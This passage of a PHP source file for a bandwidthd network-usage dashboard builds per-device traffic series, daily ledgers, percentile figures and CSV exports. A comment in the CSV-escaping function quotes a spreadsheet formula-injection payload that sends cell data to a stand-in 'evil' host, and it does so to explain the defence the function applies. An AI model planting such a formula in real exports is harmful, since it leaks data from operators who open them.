	if ($isTagScope) {
		$scope = bwd_tag_scope($tags, $period, $from, $to);
		$ipset = $scope['ips']; $keys = $scope['keys'];
		$ip = $id; $mac = '';
		$name = implode(', ', $tags);
	} elseif ($isMac) {
		$mac = strtolower(trim($id));
		$ipset = array();                         // ip => true, the device's IPs
		foreach (bwd_ips_for_mac($mac) as $i) { $ipset[$i] = true; }
		$repIp = '';
		foreach ($ipset as $i => $_) { $repIp = $i; break; }
		$ip = $id; $name = bwd_name($repIp, $mac, $names[$repIp] ?? '');
	} else {
		$ip = $id; $mac = bwd_macmap()[$ip] ?? '';
		$ipset = array($ip => true);
		$name = ($ip === '0.0.0.0') ? gettext('Interface Total') : bwd_name($ip, $mac, $names[$ip] ?? '');
	}

	if (bwd_use_db()) {
		// DB history (ts <= watermark) + live CDF tail (ts > watermark), bucketed
		// onto a common grid and summed (disjoint ranges → no double-counting).
		$W = bwd_db_watermark();
		$to2 = $to ?: time();
		$from2 = $from ?: ($to2 - bwd_default_window($period));
		$bucket = bwd_bucket_for($to2 - $from2);
		$p = BWD_DB_PREFIX;
		$agg = array();   // bucket-start => [in, out]
		if ($isTagScope) {
			// tag selection: union the tagged devices' rows (usage is identity-keyed)
			$r = $keys ? bwd_db_exec("SELECT (ts/$bucket)*$bucket b, sum(in_bytes) i, sum(out_bytes) o
				FROM {$p}usage WHERE mac = ANY($1::text[]) AND ts >= $2 AND ts <= $3 GROUP BY b",
				array(bwd_db_text_array($keys), $from2, min($to2, $W))) : false;
		} elseif (!$isMac && $ip === '0.0.0.0') {
			$r = bwd_db_exec("SELECT (ts/$bucket)*$bucket b, sum(in_bytes) i, sum(out_bytes) o
				FROM {$p}iface WHERE ts >= $1 AND ts <= $2 GROUP BY b", array($from2, min($to2, $W)));
		} elseif ($isMac) {
			// usage is MAC-keyed → one query unions all the device's IPs.
			$r = bwd_db_exec("SELECT (ts/$bucket)*$bucket b, sum(in_bytes) i, sum(out_bytes) o
				FROM {$p}usage WHERE mac = $1 AND ts >= $2 AND ts <= $3 GROUP BY b", array($mac, $from2, min($to2, $W)));
		} else {
			$r = bwd_db_exec("SELECT (ts/$bucket)*$bucket b, sum(in_bytes) i, sum(out_bytes) o
				FROM {$p}usage WHERE ip = $1 AND ts >= $2 AND ts <= $3 GROUP BY b", array($ip, $from2, min($to2, $W)));
		}
		if ($r) { while ($row = pg_fetch_assoc($r)) { $agg[(int)$row['b']] = array((float)$row['i'], (float)$row['o']); } }
		// CDF tail from the daily files (match any of the device's IPs)
		foreach (bwd_cdf_files(1) as $file) {
			$fh = @fopen($file, 'r');
			if (!$fh) { continue; }
			while (($line = fgets($fh)) !== false) {
				$f = explode(',', trim($line));
				if (count($f) < 16 || !isset($ipset[$f[0]])) { continue; }
				$ts = (int) $f[1];
				if ($ts <= $W || $ts < $from2 || $ts > $to2) { continue; }
				$b = intdiv($ts, $bucket) * $bucket;
				if (!isset($agg[$b])) { $agg[$b] = array(0.0, 0.0); }
				$agg[$b][0] += (float)$f[9]; $agg[$b][1] += (float)$f[2];
			}
			fclose($fh);
		}
		// Pre-seam DAILY tier: days the downsampler folded out of bwd_usage (so the
		// fine query above returned nothing for them) come from bwd_daily — one
		// bucket per local calendar day, placed at the day's midnight on the grid.
		// Skipped for the percentile path ($includeDaily=false): a day-average has
		// no throughput peak to take a percentile of. Disjoint from the fine tier
		// (daily owns days < seam, fine owns days >= seam) → no double-count.
		if ($includeDaily) {
			$seam = bwd_db_fine_day_start();
			$seamDay = ($seam === PHP_INT_MAX) ? null : date('Y-m-d', $seam);
			$loDay = date('Y-m-d', $from2);
			$hiDay = $seamDay ? date('Y-m-d', strtotime("$seamDay -1 day")) : date('Y-m-d', $to2);
			if (strcmp($hiDay, date('Y-m-d', $to2)) > 0) { $hiDay = date('Y-m-d', $to2); }
			if (strcmp($loDay, $hiDay) <= 0) {
				if ($isTagScope) {
					$rd = $keys ? bwd_db_exec("SELECT day::text d, sum(in_bytes) i, sum(out_bytes) o FROM {$p}daily
						WHERE mac = ANY($1::text[]) AND day >= $2 AND day <= $3 GROUP BY d",
						array(bwd_db_text_array($keys), $loDay, $hiDay)) : false;
				} elseif (!$isMac && $ip === '0.0.0.0') {
					$rd = bwd_db_exec("SELECT day::text d, sum(in_bytes) i, sum(out_bytes) o FROM {$p}daily
						WHERE mac = '0.0.0.0' AND day >= $1 AND day <= $2 GROUP BY d", array($loDay, $hiDay));
				} else {
					$rd = bwd_db_exec("SELECT day::text d, sum(in_bytes) i, sum(out_bytes) o FROM {$p}daily
						WHERE mac = $1 AND day >= $2 AND day <= $3 GROUP BY d", array($isMac ? $mac : $ip, $loDay, $hiDay));
				}
				if ($rd) {
					while ($row = pg_fetch_assoc($rd)) {
						$b = intdiv(strtotime($row['d'] . ' 00:00:00'), $bucket) * $bucket;
						if (!isset($agg[$b])) { $agg[$b] = array(0.0, 0.0); }
						$agg[$b][0] += (float)$row['i']; $agg[$b][1] += (float)$row['o'];
					}
				}
			}
		}
		ksort($agg);
		$points = array();
		foreach ($agg as $b => $io) { $points[] = array('t' => $b, 'in' => $io[0], 'out' => $io[1]); }
		return array('ip' => $ip, 'name' => $name, 'period' => bwd_period_tag($period),
			'from' => $from, 'to' => $to, 'bucket' => $bucket, 'points' => $points);
	}

	$points = array();
	foreach (bwd_cdf_files($period) as $file) {
		$fh = @fopen($file, 'r');
		if (!$fh) { continue; }
		while (($line = fgets($fh)) !== false) {
			$f = explode(',', trim($line));
			if (count($f) < 16 || !isset($ipset[$f[0]])) { continue; }
			$ts = (int) $f[1];
			if ($from && $ts < $from) { continue; }
			if ($to && $ts > $to) { continue; }
			$points[] = array('t' => $ts, 'in' => (float)$f[9], 'out' => (float)$f[2]);
		}
		fclose($fh);
	}
	// A MAC's (or tag selection's) IPs are separate CDF rows; merge same-ts samples.
	if (($isMac || $isTagScope) && $points) {
		$by = array();
		foreach ($points as $pt) {
			$t = $pt['t'];
			if (!isset($by[$t])) { $by[$t] = array('t' => $t, 'in' => 0.0, 'out' => 0.0); }
			$by[$t]['in'] += $pt['in']; $by[$t]['out'] += $pt['out'];
		}
		$points = array_values($by);
	}
	usort($points, function($a, $b) { return $a['t'] <=> $b['t']; });
	return array('ip' => $ip, 'name' => $name, 'period' => bwd_period_tag($period),
		'from' => $from, 'to' => $to, 'points' => $points);
}

/* Per-calendar-day in/out totals for a single device (IP, MAC, or 0.0.0.0 for
 * the interface total) over the dashboard window — the daily ledger behind the
 * detail chart. Honors the hybrid seam/watermark split (DB daily tier for days
 * < seam, DB fine tier for [seam,watermark], live CDF tail for ts > watermark)
 * and unions a MAC's lease-renewal IPs. Days are local calendar days, most
 * recent first. With $tags non-empty, the 0.0.0.0 id means the tag selection's
 * total (union of the tagged devices) instead of the interface sentinel.
 * Returns ['id','from','to','days'=>[['day','in','out','total'],...],
 * 'total_in','total_out','total']. */
function bwd_daily_breakdown($id, $period, $from = 0, $to = 0, $tags = array()) {
	$id = trim((string) $id);
	$isMac = (bool) preg_match('/^[0-9a-f]{2}(:[0-9a-f]{2}){5}$/i', $id);
	$isIface = ($id === '0.0.0.0');
	$isTagScope = ($tags && $isIface);
	if ($isTagScope) { $isIface = false; }
	if (!$isMac && !$isIface && !$isTagScope && !is_ipaddrv4($id)) {
		return array('id' => $id, 'from' => $from, 'to' => $to, 'days' => array(),
			'total_in' => 0, 'total_out' => 0, 'total' => 0);
	}

	$mac = $isMac ? strtolower($id) : '';
	$keys = array();                                     // DB identity keys (tag scope)
	$ipset = array();                                    // the device's IPs (CDF match)
	if ($isTagScope) {
		$scope = bwd_tag_scope($tags, $period, $from, $to);
		$ipset = $scope['ips']; $keys = $scope['keys'];
	}
	elseif ($isMac) { foreach (bwd_ips_for_mac($mac) as $i) { $ipset[$i] = true; } }
	elseif (!$isIface) { $ipset[$id] = true; }

	$days = array();                                     // 'Y-m-d' => [in, out]
	$add = function($day, $in, $out) use (&$days) {
		if (!isset($days[$day])) { $days[$day] = array(0.0, 0.0); }
		$days[$day][0] += $in; $days[$day][1] += $out;
	};
	// match a CDF row's IP against this device (or the iface sentinel).
	$wants = function($rip) use ($isIface, $ipset) {
		return $isIface ? ($rip === '0.0.0.0') : isset($ipset[$rip]);
	};

	if (bwd_use_db()) {
		// Mirror bwd_series()'s windowed default so the table matches the chart.
		$to2 = $to ?: time();
		$from2 = $from ?: ($to2 - bwd_default_window($period));
		$W = bwd_db_watermark();
		$p = BWD_DB_PREFIX;
		$seam = bwd_db_fine_day_start();
		$seamDay = ($seam === PHP_INT_MAX) ? null : date('Y-m-d', $seam);
		$fromDay = date('Y-m-d', $from2);
		$toDay   = date('Y-m-d', $to2);

		// fine tier (days >= seam): bwd_usage / bwd_iface, ts in [from2, min(to2,W)]
		if ($seamDay) {
			$fineFrom = max($from2, $seam);
			$fineTo   = min($to2, $W);
			if ($fineTo >= $fineFrom) {
				$sel = "date_trunc('day',to_timestamp(ts))::date::text d, sum(in_bytes) i, sum(out_bytes) o";
				if ($isIface) {
					$r = bwd_db_exec("SELECT $sel FROM {$p}iface WHERE ts >= $1 AND ts <= $2 GROUP BY d", array($fineFrom, $fineTo));
				} elseif ($isTagScope) {
					$r = $keys ? bwd_db_exec("SELECT $sel FROM {$p}usage WHERE mac = ANY($1::text[]) AND ts >= $2 AND ts <= $3 GROUP BY d",
						array(bwd_db_text_array($keys), $fineFrom, $fineTo)) : false;
				} elseif ($isMac) {
					$r = bwd_db_exec("SELECT $sel FROM {$p}usage WHERE mac = $1 AND ts >= $2 AND ts <= $3 GROUP BY d", array($mac, $fineFrom, $fineTo));
				} else {
					$r = bwd_db_exec("SELECT $sel FROM {$p}usage WHERE ip = $1 AND ts >= $2 AND ts <= $3 GROUP BY d", array($id, $fineFrom, $fineTo));
				}
				if ($r) { while ($x = pg_fetch_assoc($r)) { $add($x['d'], (float)$x['i'], (float)$x['o']); } }
			}
		}
		// daily tier (days < seam): bwd_daily (mac-keyed; ip-fallback stores ip in mac col)
		$dailyTo = $seamDay ? date('Y-m-d', strtotime("$seamDay -1 day")) : $toDay;
		if (strcmp($fromDay, $dailyTo) <= 0) {
			$hi = (strcmp($dailyTo, $toDay) < 0) ? $dailyTo : $toDay;
			if ($isIface) {
				$r = bwd_db_exec("SELECT day::text d, in_bytes i, out_bytes o FROM {$p}daily
					WHERE mac = '0.0.0.0' AND day >= $1 AND day <= $2", array($fromDay, $hi));
			} elseif ($isTagScope) {
				$r = $keys ? bwd_db_exec("SELECT day::text d, sum(in_bytes) i, sum(out_bytes) o FROM {$p}daily
					WHERE mac = ANY($1::text[]) AND day >= $2 AND day <= $3 GROUP BY d",
					array(bwd_db_text_array($keys), $fromDay, $hi)) : false;
			} else {
				$r = bwd_db_exec("SELECT day::text d, sum(in_bytes) i, sum(out_bytes) o FROM {$p}daily
					WHERE mac = $1 AND day >= $2 AND day <= $3 GROUP BY d", array($isMac ? $mac : $id, $fromDay, $hi));
			}
			if ($r) { while ($x = pg_fetch_assoc($r)) { $add($x['d'], (float)$x['i'], (float)$x['o']); } }
		}
		// live CDF tail (ts > watermark)
		foreach (bwd_cdf_files(1) as $file) {
			$fh = @fopen($file, 'r');
			if (!$fh) { continue; }
			while (($line = fgets($fh)) !== false) {
				$f = explode(',', trim($line));
				if (count($f) < 16 || !$wants($f[0])) { continue; }
				$ts = (int) $f[1];
				if ($ts <= $W || $ts < $from2 || $ts > $to2) { continue; }
				$add(date('Y-m-d', $ts), (float)$f[9], (float)$f[2]);
			}
			fclose($fh);
		}
	} else {
		// CDF-only: single pass over the period files (raw from/to, like bwd_series).
		foreach (bwd_cdf_files($period) as $file) {
			$fh = @fopen($file, 'r');
			if (!$fh) { continue; }
			while (($line = fgets($fh)) !== false) {
				$f = explode(',', trim($line));
				if (count($f) < 16 || !$wants($f[0])) { continue; }
				$ts = (int) $f[1];
				if ($from && $ts < $from) { continue; }
				if ($to && $ts > $to) { continue; }
				$add(date('Y-m-d', $ts), (float)$f[9], (float)$f[2]);
			}
			fclose($fh);
		}
	}

	krsort($days);                                       // most-recent day first
	$out = array(); $tin = 0.0; $tout = 0.0;
	foreach ($days as $day => $io) {
		$out[] = array('day' => $day, 'in' => $io[0], 'out' => $io[1], 'total' => $io[0] + $io[1]);
		$tin += $io[0]; $tout += $io[1];
	}
	return array('id' => $id, 'from' => $from, 'to' => $to, 'days' => $out,
		'total_in' => $tin, 'total_out' => $tout, 'total' => $tin + $tout);
}

/* Overview for the dashboard summary cards + stacked-area chart. Picks the
 * top-N hosts by total traffic, buckets every CDF sample in the window into a
 * common time axis (~60 bins), and returns per-series bytes-per-bin (top hosts
 * + an aggregated "Other"). One extra CDF pass on top of bwd_hosts(). With
 * $tags non-empty every aggregate is scoped to devices carrying any selected
 * tag — cards, top-N and "Other" then describe the tag selection, not the
 * interface (untagged devices drop out entirely). */
function bwd_overview($period, $from = 0, $to = 0, $topn = 8, $tags = array()) {
	$data = bwd_hosts($period, $from, $to);
	$hosts = $data['hosts'];
	if ($tags) {
		$hosts = array_values(array_filter($hosts, function ($h) use ($tags) {
			return bwd_host_has_tag($h, $tags);
		}));
	}

	if (bwd_use_db()) {
		$end = $to ?: time();
		$start = $from ?: ($end - bwd_default_window($period));
	} else {
		$start = $from ?: $data['min_t'];
		$end   = $to   ?: $data['max_t'];
	}
	if ($end <= $start) { $end = $start + 86400; }
	$span  = $end - $start;
	/* ~60 buckets, but never narrower than the CDF write cadence: the client
	 * converts bytes-per-bucket to Mbps, and a bucket smaller than the sample
	 * interval gets one sample's whole byte count, inflating the rate. */
	$bin   = (int) max(60, ceil($span / 60));
	$cdfInterval = bwd_cdf_interval($period);
	if ($cdfInterval > $bin) { $bin = $cdfInterval; }
	$start = (int) (floor($start / $bin) * $bin);     // align to bin
	$nbins = (int) (floor(($end - $start) / $bin)) + 1;

	$labels = array();
	for ($i = 0; $i < $nbins; $i++) { $labels[] = $start + $i * $bin; }

	// Top-N devices; everything else folds into "other". Hosts are already
	// consolidated by MAC, so map every IP a device used to its one series.
	$top = array_slice($hosts, 0, $topn);
	$idx = array();                                   // ip -> series index
	$series = array();
	foreach ($top as $si => $h) {
		foreach (($h['ips'] ?? array($h['ip'])) as $ip) { $idx[$ip] = $si; }
		$series[$si] = array('key' => $h['ip'], 'name' => $h['name'] ?: $h['ip'],
			'tag' => $h['tag'] ?? '', 'data' => array_fill(0, $nbins, 0.0));
	}
	$otherIdx = count($series);
	$series[$otherIdx] = array('key' => 'other', 'name' => gettext('Other'),
		'tag' => '', 'data' => array_fill(0, $nbins, 0.0));
	$totalLine = array_fill(0, $nbins, 0.0);

	// With a tag scope, only the tagged devices' IPs count — anything else is
	// excluded outright (NOT folded into "Other", which is other tagged devices).
	$allowed = null;
	if ($tags) {
		$allowed = array();
		foreach ($hosts as $h) {
			foreach (($h['ips'] ?? array($h['ip'])) as $aip) { $allowed[$aip] = true; }
		}
	}
	/* Scope keys mirror bwd_series' MAC-keying, so a tagged device's historical IP
	 * is not lost the way the live-host IP set ($allowed) would lose it. Resolved
	 * once here because BOTH durable tiers below need it. */
	$scopeKeys = $tags ? bwd_tag_scope($tags, $period, $from, $to)['keys'] : null;
	/* $allowed is captured BY REFERENCE: the daily-tier loop below adds a tagged
	 * device's historical IPs to it as it goes, and a by-value capture would keep
	 * the pre-loop copy and drop exactly those rows — the pre-seam traffic the
	 * scope gate is there to let through. */
	$route = function($ip, $b, $bytes) use (&$series, &$totalLine, $idx, $otherIdx, $nbins, &$allowed) {
		if ($b < 0 || $b >= $nbins) { return; }
		if ($ip === '0.0.0.0') { $totalLine[$b] += $bytes; return; }
		if ($allowed !== null && !isset($allowed[$ip])) { return; }
		$series[$idx[$ip] ?? $otherIdx]['data'][$b] += $bytes;
	};

	if (bwd_use_db()) {
		// DB history (ts <= watermark) binned per ip + the live CDF tail (ts > W).
		$W = bwd_db_watermark();
		$p = BWD_DB_PREFIX;
		$dbEnd = min($end, $W);
		/* Under a tag scope, select the fine tier BY IDENTITY (mac = ANY(keys)), the
		 * same way bwd_series does. Selecting every IP and then gating on the
		 * live-host set drops a tagged device's rows under an IP it no longer holds
		 * — so the stacked chart under-reported against the toolbar pills and the
		 * per-device series, which do union those historical IPs. Rows that arrive
		 * this way are added to $allowed so $route admits them. */
		if ($scopeKeys !== null) {
			$r = $scopeKeys ? bwd_db_exec("SELECT ((ts - $start)/$bin) bin, ip, sum(in_bytes+out_bytes) bytes
				FROM {$p}usage WHERE mac = ANY($1::text[]) AND ts >= $2 AND ts <= $3 GROUP BY bin, ip",
				array(bwd_db_text_array($scopeKeys), $start, $dbEnd)) : false;
		} else {
			$r = bwd_db_exec("SELECT ((ts - $start)/$bin) bin, ip, sum(in_bytes+out_bytes) bytes
				FROM {$p}usage WHERE ts >= $1 AND ts <= $2 GROUP BY bin, ip", array($start, $dbEnd));
		}
		if ($r) {
			while ($row = pg_fetch_assoc($r)) {
				if ($scopeKeys !== null && $allowed !== null) { $allowed[$row['ip']] = true; }
				$route($row['ip'], (int)$row['bin'], (float)$row['bytes']);
			}
		}
		if (!$tags) {   // iface totals are meaningless under a tag scope
			$ri = bwd_db_exec("SELECT ((ts - $start)/$bin) bin, sum(in_bytes+out_bytes) bytes
				FROM {$p}iface WHERE ts >= $1 AND ts <= $2 GROUP BY bin", array($start, $dbEnd));
			if ($ri) { while ($row = pg_fetch_assoc($ri)) { $route('0.0.0.0', (int)$row['bin'], (float)$row['bytes']); } }
		}
		foreach (bwd_cdf_files(1) as $file) {
			$fh = @fopen($file, 'r');
			if (!$fh) { continue; }
			while (($line = fgets($fh)) !== false) {
				$f = explode(',', trim($line));
				if (count($f) < 16) { continue; }
				$ip = $f[0];
				if (!is_ipaddrv4($ip)) { continue; }
				$ts = (int) $f[1];
				if ($ts <= $W || $ts < $start || $ts > $end) { continue; }
				$route($ip, (int) (($ts - $start) / $bin), (float)$f[2] + (float)$f[9]);
			}
			fclose($fh);
		}
		// Pre-seam DAILY tier for the stacked chart: days downsampled out of
		// bwd_usage. One bucket per local day at the day's midnight, routed by the
		// daily row's descriptive IP (folds to "Other" if not a top-N IP). Disjoint
		// from the fine query above (daily owns days < seam) → no double-count.
		$seam = bwd_db_fine_day_start();
		$seamDay = ($seam === PHP_INT_MAX) ? null : date('Y-m-d', $seam);
		$loDay = date('Y-m-d', $start);
		$hiDay = $seamDay ? date('Y-m-d', strtotime("$seamDay -1 day")) : date('Y-m-d', $end);
		if (strcmp($hiDay, date('Y-m-d', $end)) > 0) { $hiDay = date('Y-m-d', $end); }
		if (strcmp($loDay, $hiDay) <= 0) {
			$dayBin = function ($d) use ($start, $bin) { return max(0, (int) floor((strtotime($d . ' 00:00:00') - $start) / $bin)); };
			if ($scopeKeys === null) {
				$rd = bwd_db_exec("SELECT day::text d, ip, sum(in_bytes+out_bytes) bytes FROM {$p}daily
					WHERE mac <> '0.0.0.0' AND day >= $1 AND day <= $2 GROUP BY d, ip", array($loDay, $hiDay));
			} else {
				$rd = $scopeKeys ? bwd_db_exec("SELECT day::text d, ip, sum(in_bytes+out_bytes) bytes FROM {$p}daily
					WHERE mac = ANY($1::text[]) AND day >= $2 AND day <= $3 GROUP BY d, ip",
					array(bwd_db_text_array($scopeKeys), $loDay, $hiDay)) : false;
			}
			if ($rd) {
				while ($row = pg_fetch_assoc($rd)) {
					if ($scopeKeys !== null && $allowed !== null) { $allowed[$row['ip']] = true; }   // tagged daily IP passes the scope gate
					$route($row['ip'], $dayBin($row['d']), (float)$row['bytes']);
				}
			}
			if (!$tags) {   // interface sentinel line
				$ri = bwd_db_exec("SELECT day::text d, sum(in_bytes+out_bytes) bytes FROM {$p}daily
					WHERE mac = '0.0.0.0' AND day >= $1 AND day <= $2 GROUP BY d", array($loDay, $hiDay));
				if ($ri) { while ($row = pg_fetch_assoc($ri)) { $route('0.0.0.0', $dayBin($row['d']), (float)$row['bytes']); } }
			}
		}
	} else {
		// CDF-only: single pass over the period files.
		foreach (bwd_cdf_files($period) as $file) {
			$fh = @fopen($file, 'r');
			if (!$fh) { continue; }
			while (($line = fgets($fh)) !== false) {
				$f = explode(',', trim($line));
				if (count($f) < 16) { continue; }
				$ip = $f[0];
				if (!is_ipaddrv4($ip)) { continue; }
				$ts = (int) $f[1];
				if ($ts < $start || $ts > $end) { continue; }
				if ($from && $ts < $from) { continue; }
				if ($to && $ts > $to) { continue; }
				$route($ip, (int) (($ts - $start) / $bin), (float)$f[2] + (float)$f[9]);
			}
			fclose($fh);
		}
	}

	// Peak bin (by stacked host total) for a summary card.
	$peakVal = 0.0; $peakAt = $start;
	for ($i = 0; $i < $nbins; $i++) {
		$sum = 0.0;
		foreach ($series as $s) { $sum += $s['data'][$i]; }
		if ($sum > $peakVal) { $peakVal = $sum; $peakAt = $labels[$i]; }
	}
	// Tag scope: the percentile is the tag selection's throughput (bwd_series
	// unions the tagged devices), and the totals are summed over the selection.
	$p95 = bwd_percentile('0.0.0.0', $period, $from, $to, 95, $tags);
	if ($tags) {
		$tin = 0.0; $tout = 0.0;
		foreach ($hosts as $h) { $tin += $h['in']; $tout += $h['out']; }
	} else {
		$tin = $data['total_in']; $tout = $data['total_out'];
	}

	$topHost = $hosts ? array('ip' => $hosts[0]['ip'], 'name' => $hosts[0]['name'],
		'total' => $hosts[0]['total'], 'tag' => $hosts[0]['tag'] ?? '') : null;

	return array(
		'period' => bwd_period_tag($period), 'from' => $from, 'to' => $to,
		'tags' => array_values($tags),
		'bin' => $bin, 'start' => $start, 'labels' => $labels,
		'series' => array_values($series),
		'summary' => array(
			'total_in' => $tin, 'total_out' => $tout,
			'total' => $tin + $tout,
			'hosts' => count($hosts), 'top' => $topHost,
			'pct95_total_bps' => $p95['total_bps'],
			'peak_bin_bytes' => $peakVal, 'peak_bin_t' => $peakAt, 'peak_bin_secs' => $bin,
		),
	);
}

/* Linear-interpolated percentile of a numeric array (e.g. 95 -> 95th). */
function bwd_pctile($arr, $pct) {
	$n = count($arr);
	if ($n === 0) { return 0.0; }
	sort($arr);
	if ($n === 1) { return (float) $arr[0]; }
	$rank = ($pct / 100) * ($n - 1);
	$lo = (int) floor($rank); $hi = (int) ceil($rank);
	if ($lo === $hi) { return (float) $arr[$lo]; }
	return $arr[$lo] + ($arr[$hi] - $arr[$lo]) * ($rank - $lo);
}

/* 95th-percentile (default) throughput for a single IP over the same window the
 * dashboard uses. bandwidthd logs bytes-per-interval, so each sample's rate is
 * bytes*8 / interval; the interval is taken as the median gap between samples
 * (robust against CDF rotation gaps). Returns bits/sec for in/out/total.
 * $tags scopes the 0.0.0.0 id to the tag selection (see bwd_series).
 * NOTE: deliberately excludes the coarse daily tier ($includeDaily=false) — a
 * downsampled day is a single day-total bucket with no sub-day throughput peak, so
 * a percentile over it is meaningless; p95 is computed over fine + live samples
 * only (it returns 0 samples when the window is entirely in the daily tier). */
function bwd_percentile($ip, $period, $from = 0, $to = 0, $pct = 95, $tags = array()) {
	$s = bwd_series($ip, $period, $from, $to, $tags, false);
	$pts = $s['points'];
	$n = count($pts);
	$res = array('ip' => $ip, 'name' => $s['name'] ?? '', 'pct' => $pct,
		'in_bps' => 0.0, 'out_bps' => 0.0, 'total_bps' => 0.0, 'samples' => $n, 'interval' => 0);
	if ($n < 2) { return $res; }
	$deltas = array();
	for ($i = 1; $i < $n; $i++) {
		$dt = $pts[$i]['t'] - $pts[$i - 1]['t'];
		if ($dt > 0) { $deltas[] = $dt; }
	}
	if (!$deltas) { return $res; }
	sort($deltas);
	$interval = $deltas[intdiv(count($deltas), 2)];   // median gap
	if ($interval <= 0) { return $res; }
	$ins = array(); $outs = array(); $tots = array();
	foreach ($pts as $p) {
		$ins[]  = $p['in']  * 8 / $interval;
		$outs[] = $p['out'] * 8 / $interval;
		$tots[] = ($p['in'] + $p['out']) * 8 / $interval;
	}
	$res['interval']  = $interval;
	$res['in_bps']    = bwd_pctile($ins, $pct);
	$res['out_bps']   = bwd_pctile($outs, $pct);
	$res['total_bps'] = bwd_pctile($tots, $pct);
	return $res;
}

/* Median gap between CDF samples for a period tier, in seconds.
 *
 * bandwidthd logs bytes-per-interval, so a chart bucket narrower than that
 * interval receives one sample's WHOLE byte count and reads high by
 * interval/bucket — with the observed ~200s cadence and a 60s bucket, spikes
 * render ~3.4x their true rate with zero-gaps between them. Callers that convert
 * bytes-per-bucket into a rate must therefore floor their bucket at this.
 *
 * Only the newest file's tail is scanned: the cadence is a property of the
 * daemon's write loop, not of history, so a sample of recent timestamps answers
 * it without parsing the whole log. Returns 0 when it cannot be determined. */
function bwd_cdf_interval($period) {
	static $cache = array();
	$tag = bwd_period_tag($period);
	if (isset($cache[$tag])) { return $cache[$tag]; }
	$cache[$tag] = 0;

	$files = bwd_cdf_files($period);
	if (!$files) { return 0; }
	$f = end($files);                       // newest slot
	$fh = @fopen($f, 'r');
	if ($fh === false) { return 0; }
	/* Read the last ~64KB; the timestamp is field 1 of each record. */
	$size = filesize($f);
	if ($size > 65536) { fseek($fh, -65536, SEEK_END); fgets($fh); }
	$seen = array();
	while (($line = fgets($fh)) !== false) {
		$c = strpos($line, ',');
		if ($c === false) { continue; }
		$c2 = strpos($line, ',', $c + 1);
		if ($c2 === false) { continue; }
		$ts = (int) substr($line, $c + 1, $c2 - $c - 1);
		if ($ts > 0) { $seen[$ts] = true; }
	}
	fclose($fh);
	if (count($seen) < 3) { return 0; }

	$ts = array_keys($seen);
	sort($ts);
	$deltas = array();
	for ($i = 1, $n = count($ts); $i < $n; $i++) {
		$d = $ts[$i] - $ts[$i - 1];
		if ($d > 0) { $deltas[] = $d; }
	}
	if (!$deltas) { return 0; }
	sort($deltas);
	$cache[$tag] = (int) $deltas[intdiv(count($deltas), 2)];   // median gap
	return $cache[$tag];
}

/* Neutralise a spreadsheet formula in a CSV cell.
 *
 * fputcsv quotes commas and quotes, which makes the file parse correctly — it does
 * nothing about Excel and LibreOffice treating a leading =, +, -, @, tab or CR as
 * the start of a formula. These fields are not ours: a device picks its own DHCP
 * hostname, and vendor/model can come from a probed device's own HTTP response. A
 * device named =HYPERLINK("http://evil/"&A1,"click") would otherwise execute when
 * the operator opens the export. Prefixing an apostrophe is the usual defence: the
 * cell still reads as text and the value survives. */
function bwd_csv_cell($v) {
	$v = (string) $v;
	return ($v !== '' && strpos("=+-@\t\r", $v[0]) !== false) ? "'" . $v : $v;
}

/* Build a CSV (string, no output) of a bwd_hosts() result's per-host rows plus
 * the interface-total row. Bytes are raw integers for downstream analysis. */
function bwd_hosts_csv($data) {
	$rows = array();
	$rows[] = array('ip', 'name', 'mac', 'vendor', 'model', 'tag', 'in_bytes', 'out_bytes', 'total_bytes');
	$emit = function($h) use (&$rows) {
		$rows[] = array(bwd_csv_cell($h['ip']), bwd_csv_cell($h['name'] ?? ''),
			bwd_csv_cell($h['mac'] ?? ''), bwd_csv_cell($h['vendor'] ?? ''),
			bwd_csv_cell($h['model'] ?? ''), bwd_csv_cell($h['tag'] ?? ''),
			(int) round($h['in']), (int) round($h['out']),
			(int) round($h['in'] + $h['out']));
	};
	if (!empty($data['total_host'])) { $emit($data['total_host']); }
	foreach ($data['hosts'] as $h) { $emit($h); }
	$out = fopen('php://temp', 'r+');
	foreach ($rows as $r) { fputcsv($out, $r); }
	rewind($out);
	$csv = stream_get_contents($out);
	fclose($out);
	return $csv;
}
